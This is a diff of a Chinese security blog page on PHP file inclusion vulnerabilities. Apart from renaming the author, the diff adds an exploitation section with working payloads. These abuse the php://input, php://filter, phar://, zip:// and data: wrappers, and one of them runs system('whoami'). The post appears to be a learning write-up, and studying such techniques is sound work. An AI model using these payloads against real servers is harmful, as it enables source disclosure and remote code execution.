@@ -74,7 +74,7 @@
 
 
 
-  <link rel="alternate" href="/atom.xml" title="Mask's Blog" type="application/atom+xml">
+  <link rel="alternate" href="/atom.xml" title="xianyu123's Blog" type="application/atom+xml">
 
 
 
@@ -85,14 +85,14 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅谈php文件包含漏洞">
 <meta property="og:url" content="https://xianyu123.me/2018/10/25/php文件包含漏洞/index.html">
-<meta property="og:site_name" content="Mask&#39;s Blog">
+<meta property="og:site_name" content="xianyu123&#39;s Blog">
 <meta property="og:description" content="php文件包含漏洞学习合上吧，没有新姿势。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://images.xianyu123.club/include.png?imageslim">
 <meta property="og:image" content="http://images.xianyu123.club/require.png?imageslim">
 <meta property="og:image" content="http://images.xianyu123.club/LFI示例.png?imageslim">
 <meta property="og:image" content="http://images.xianyu123.club/RFI示例.png?imageslim">
-<meta property="og:updated_time" content="2019-05-11T12:52:58.624Z">
+<meta property="og:updated_time" content="2019-08-22T07:36:41.499Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈php文件包含漏洞">
 <meta name="twitter:description" content="php文件包含漏洞学习合上吧，没有新姿势。">
@@ -133,7 +133,7 @@
 
 
 
-  <title>浅谈php文件包含漏洞 | Mask's Blog</title>
+  <title>浅谈php文件包含漏洞 | xianyu123's Blog</title>
   
 
 
@@ -163,7 +163,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Mask's Blog</span>
+        <span class="site-title">xianyu123's Blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -303,13 +303,13 @@
     <link itemprop="mainEntityOfPage" href="https://xianyu123.me/2018/10/25/php文件包含漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Mask">
+      <meta itemprop="name" content="xianyu123">
       <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Mask's Blog">
+      <meta itemprop="name" content="xianyu123's Blog">
     </span>
 
     
@@ -447,53 +447,47 @@
 <p>……..</p>
 </li>
 </ul>
-<h1 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" title="本地文件包含利用"></a>本地文件包含利用</h1><h2 id="1-包含用户上传的文件"><a href="#1-包含用户上传的文件" class="headerlink" title="1. 包含用户上传的文件"></a>1. 包含用户上传的文件</h2><h2 id="2-使用PHP封装协议"><a href="#2-使用PHP封装协议" class="headerlink" title="2. 使用PHP封装协议"></a>2. 使用PHP封装协议</h2><p>PHP带有很多内置URL风格的封装协议，这类协议与<code>fopen()</code>、<code>copy()</code>、<code>file_exists</code>等文件系统函数所提供的功能类似。常见的协议如下，更多协议请参照<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">php支持的协议和封装协议</a></p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>file://</td>
-<td>访问本地文件系统</td>
-</tr>
-<tr>
-<td>http://</td>
-<td>访问HTTP(s)网址</td>
-</tr>
-<tr>
-<td>ftp://</td>
-<td>访问FTP（s）URLs</td>
-</tr>
-<tr>
-<td>php://</td>
-<td>访问输入/输出流(I/O streams)</td>
-</tr>
-<tr>
-<td>zlib://</td>
-<td>压缩流</td>
-</tr>
-<tr>
-<td>data://</td>
-<td>数据(RFC2397)</td>
-</tr>
-<tr>
-<td>ssh2://</td>
-<td>Secure Shell 2</td>
-</tr>
-<tr>
-<td>expect://</td>
-<td>处理交互式的流</td>
-</tr>
-<tr>
-<td>glob://</td>
-<td>查找匹配的文件路径</td>
-</tr>
-</tbody>
-</table>
+<h1 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" title="本地文件包含利用"></a>本地文件包含利用</h1><h2 id="1-包含用户上传的文件"><a href="#1-包含用户上传的文件" class="headerlink" title="1. 包含用户上传的文件"></a>1. 包含用户上传的文件</h2><h2 id="2-php伪协议"><a href="#2-php伪协议" class="headerlink" title="2. php伪协议"></a>2. php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p>姿势：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：无甚</p>
+<p>姿势：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+<p>此协议可以文件的读写，更多姿势<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">可用过滤器列表</a></p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：</p>
+<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包</p>
+<p>指定绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p>或者使用相对路径（这里test.zip就在当前目录下）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：<br>构造zip包的方法同phar。</p>
+<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p>若是使用相对路径，则会包含失败。</p>
+<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>姿势一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>姿势二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
 <h2 id="3-包含Session文件"><a href="#3-包含Session文件" class="headerlink" title="3. 包含Session文件"></a>3. 包含Session文件</h2><h2 id="4-包含日志文件，比如Web-Server的acess-log"><a href="#4-包含日志文件，比如Web-Server的acess-log" class="headerlink" title="4. 包含日志文件，比如Web Server的acess log"></a>4. 包含日志文件，比如Web Server的acess log</h2><h2 id="5-包含-proc-self-environ文件"><a href="#5-包含-proc-self-environ文件" class="headerlink" title="5. 包含/proc/self/environ文件"></a>5. 包含/proc/self/environ文件</h2><h2 id="6-包含上传的临时文件-RFC1867"><a href="#6-包含上传的临时文件-RFC1867" class="headerlink" title="6. 包含上传的临时文件(RFC1867)"></a>6. 包含上传的临时文件(RFC1867)</h2><h2 id="7-包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析"><a href="#7-包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析" class="headerlink" title="7. 包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析"></a>7. 包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析</h2><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
 <li>《白帽子讲Web安全》</li>
 <li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Chybeta:php文件包含漏洞</a></li>
@@ -517,9 +511,9 @@
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
   <p><span>本文标题:</span><a href="/2018/10/25/php文件包含漏洞/">浅谈php文件包含漏洞</a></p>
-  <p><span>文章作者:</span><a href="/" title="访问 Mask 的个人博客">Mask</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
   <p><span>发布时间:</span>2018年10月25日 - 21:07</p>
-  <p><span>最后更新:</span>2019年05月11日 - 20:52</p>
+  <p><span>最后更新:</span>2019年08月22日 - 15:36</p>
   <p><span>原始链接:</span><a href="/2018/10/25/php文件包含漏洞/" title="浅谈php文件包含漏洞">https://xianyu123.me/2018/10/25/php文件包含漏洞/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xianyu123.me/2018/10/25/php文件包含漏洞/" aria-label="复制成功！"></i></span>
   </p>
@@ -654,7 +648,7 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <p class="site-author-name" itemprop="name">Mask</p>
+              <p class="site-author-name" itemprop="name">xianyu123</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -756,7 +750,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#导致文件包含漏洞的函数"><span class="nav-number">1.</span> <span class="nav-text">导致文件包含漏洞的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本地文件包含"><span class="nav-number">1.1.</span> <span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程文件包含"><span class="nav-number">1.2.</span> <span class="nav-text">远程文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他文件操作函数"><span class="nav-number">1.3.</span> <span class="nav-text">其他文件操作函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#本地文件包含利用"><span class="nav-number">2.</span> <span class="nav-text">本地文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-包含用户上传的文件"><span class="nav-number">2.1.</span> <span class="nav-text">1. 包含用户上传的文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-使用PHP封装协议"><span class="nav-number">2.2.</span> <span class="nav-text">2. 使用PHP封装协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-包含Session文件"><span class="nav-number">2.3.</span> <span class="nav-text">3. 包含Session文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-包含日志文件，比如Web-Server的acess-log"><span class="nav-number">2.4.</span> <span class="nav-text">4. 包含日志文件，比如Web Server的acess log</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-包含-proc-self-environ文件"><span class="nav-number">2.5.</span> <span class="nav-text">5. 包含/proc/self/environ文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-包含上传的临时文件-RFC1867"><span class="nav-number">2.6.</span> <span class="nav-text">6. 包含上传的临时文件(RFC1867)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析"><span class="nav-number">2.7.</span> <span class="nav-text">7. 包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御方法"><span class="nav-number">3.</span> <span class="nav-text">防御方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#导致文件包含漏洞的函数"><span class="nav-number">1.</span> <span class="nav-text">导致文件包含漏洞的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本地文件包含"><span class="nav-number">1.1.</span> <span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程文件包含"><span class="nav-number">1.2.</span> <span class="nav-text">远程文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他文件操作函数"><span class="nav-number">1.3.</span> <span class="nav-text">其他文件操作函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#本地文件包含利用"><span class="nav-number">2.</span> <span class="nav-text">本地文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-包含用户上传的文件"><span class="nav-number">2.1.</span> <span class="nav-text">1. 包含用户上传的文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-php伪协议"><span class="nav-number">2.2.</span> <span class="nav-text">2. php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input"><span class="nav-number">2.2.1.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter"><span class="nav-number">2.2.2.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar"><span class="nav-number">2.2.3.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zip"><span class="nav-number">2.2.4.</span> <span class="nav-text">zip://</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-URI-schema"><span class="nav-number">2.2.5.</span> <span class="nav-text">data:URI schema</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-包含Session文件"><span class="nav-number">2.3.</span> <span class="nav-text">3. 包含Session文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-包含日志文件，比如Web-Server的acess-log"><span class="nav-number">2.4.</span> <span class="nav-text">4. 包含日志文件，比如Web Server的acess log</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-包含-proc-self-environ文件"><span class="nav-number">2.5.</span> <span class="nav-text">5. 包含/proc/self/environ文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-包含上传的临时文件-RFC1867"><span class="nav-number">2.6.</span> <span class="nav-text">6. 包含上传的临时文件(RFC1867)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析"><span class="nav-number">2.7.</span> <span class="nav-text">7. 包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御方法"><span class="nav-number">3.</span> <span class="nav-text">防御方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
@@ -780,7 +774,7 @@
   <span class="with-love">
    
   </span>
-  <span class="author" itemprop="copyrightHolder">Mask</span>
+  <span class="author" itemprop="copyrightHolder">xianyu123</span>
 
   
 </div>
